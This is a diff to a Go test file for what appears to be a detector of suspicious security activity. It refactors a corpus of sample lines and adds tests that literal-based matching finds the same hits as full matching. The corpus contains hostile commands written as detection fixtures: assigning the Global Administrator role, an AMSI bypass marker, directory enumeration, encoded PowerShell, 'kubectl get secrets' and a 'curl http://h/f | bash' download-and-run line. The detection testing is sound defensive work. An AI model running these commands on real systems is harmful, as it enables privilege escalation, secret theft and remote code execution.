@@ -1,10 +1,13 @@
 package activity
 
 import (
+	"reflect"
 	"slices"
 	"strings"
 	"testing"
 	"unicode/utf8"
+
+	"github.com/get-sybers/slopmop/internal/sift"
 )
 
 func names(hits []Hit) []string {
@@ -463,15 +466,10 @@ func TestDecodeRejects(t *testing.T) {
 	}
 }
 
-// A pattern is tried only on the lines that hold one of its literals, so a
-// literal that is wrong hides matches. Every pattern must have literals, and
-// every line a pattern matches must hold one of them.
-func TestLiteralsAreSound(t *testing.T) {
-	table, err := LoadActivities()
-	if err != nil {
-		t.Fatal(err)
-	}
-	corpus := []string{
+// corpus holds a line for every pattern of the table: what the checks of the
+// literals read.
+func corpus() []string {
+	lines := []string{
 		"Invoke-RestMethod -Method Post -Uri https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/$ref",
 		`ADD-MSOLROLEMEMBER -RoleName "Company Administrator"`,
 		"62e90394-69f5-4237-9190-012177145e10 given by role assignment", "Global Administrator role assignment",
@@ -514,8 +512,20 @@ func TestLiteralsAreSound(t *testing.T) {
 		"amsiInitFailed", "sc query", "New-Object DirectoryServices.DirectorySearcher", "[adsisearcher]'(x)'", "New-Object Management.ManagementObjectSearcher($q)",
 	}
 	for _, c := range linuxCases {
-		corpus = append(corpus, c.line)
+		lines = append(lines, c.line)
 	}
+	return lines
+}
+
+// A pattern is tried only on the lines that hold one of its literals, so a
+// literal that is wrong hides matches. Every pattern must have literals, and
+// every line a pattern matches must hold one of them.
+func TestLiteralsAreSound(t *testing.T) {
+	table, err := LoadActivities()
+	if err != nil {
+		t.Fatal(err)
+	}
+	corpus := corpus()
 	check := func(owner string, p pattern) {
 		if len(p.literals) == 0 {
 			t.Errorf("%s: %s has no literal, so it is tried on every line", owner, p.rx)
@@ -530,6 +540,9 @@ func TestLiteralsAreSound(t *testing.T) {
 			}
 			if !held {
 				t.Errorf("%s: %s matches %q, which holds none of %q", owner, p.rx, line, p.literals)
+			}
+			if !sift.Holds(sift.Lower(line), p.sets) {
+				t.Errorf("%s: %s matches %q, which lacks a text of one of %q", owner, p.rx, line, p.sets)
 			}
 		}
 	}
@@ -578,7 +591,8 @@ func TestRequired(t *testing.T) {
 		{`abc|[0-9]+`, nil},
 		{`ab|cd`, nil},
 		{`\d+\.\d+`, nil},
-		{`(?i)sécrets`, nil},
+		{`(?i)sécrets`, []string{"crets"}},
+		{`(?i)-(?:EncodedCommand|enc)\s`, []string{"-enc"}},
 	}
 	for _, tt := range tests {
 		t.Run(tt.expr, func(t *testing.T) {
@@ -592,6 +606,54 @@ func TestRequired(t *testing.T) {
 			}
 			if !slices.Equal(got, tt.want) {
 				t.Errorf("literals of %s = %q, want %q", tt.expr, got, tt.want)
+			}
+		})
+	}
+}
+
+// untried is the table with no literal and no needed text, so that every
+// pattern is tried on every line: what the search by literal must equal.
+func untried(t Table) Table {
+	bare := func(patterns []pattern) []pattern {
+		out := make([]pattern, len(patterns))
+		for i, p := range patterns {
+			out[i] = pattern{rx: p.rx}
+		}
+		return out
+	}
+	plain := Table{contexts: map[string]pattern{}}
+	for name, p := range t.contexts {
+		plain.contexts[name] = pattern{rx: p.rx}
+	}
+	for _, a := range t.activities {
+		a.patterns, a.paths = bare(a.patterns), bare(a.paths)
+		plain.activities = append(plain.activities, a)
+	}
+	return plain
+}
+
+// Trying a pattern only on the lines that hold its texts finds what trying
+// it on every line finds, in a small text, a large one and one that folds.
+func TestDetectByLiteralEqualsEveryLine(t *testing.T) {
+	table, err := LoadActivities()
+	if err != nil {
+		t.Fatal(err)
+	}
+	plain := untried(table)
+	lines := strings.Join(corpus(), "\n") + "\n"
+	for _, tt := range []struct{ name, text string }{
+		{"the corpus", lines},
+		{"a large text", strings.Repeat(lines, 1+small/len(lines))},
+		{"upper case", strings.ToUpper(lines)},
+		{"a letter that folds", lines + "\u212aubectl get \u017fecrets\ncurl http://h/f | ba\u017fh\n"},
+	} {
+		t.Run(tt.name, func(t *testing.T) {
+			got, want := table.Detect(tt.text), plain.Detect(tt.text)
+			if len(want) < 20 {
+				t.Fatalf("every line shows %d activities: the text does not try the literals", len(want))
+			}
+			if !reflect.DeepEqual(got, want) {
+				t.Errorf("by literal: %d activities, every line: %d; the two differ", len(got), len(want))
 			}
 		})
 	}
